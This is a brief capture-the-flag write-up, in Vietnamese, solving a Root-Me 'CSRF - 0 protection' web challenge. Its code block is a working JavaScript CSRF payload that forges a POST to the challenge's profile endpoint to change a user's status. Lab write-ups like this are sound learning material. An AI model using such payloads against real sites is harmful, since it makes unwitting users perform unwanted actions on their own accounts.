# CSRF - 0 protection

## Solution

Sử dụng chức năng `contact` để xử lý việc này. Nó không hỗ trợ jQuery vì origin page không bao gồm tệp jQuery, vì vậy phải sử dụng ajax.

```
windows.onload=function(){
var xmlhttp;
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xmlhttp=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
xmlhttp.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile",true);
xmlhttp.send("username=repoog&status=on");
}
```
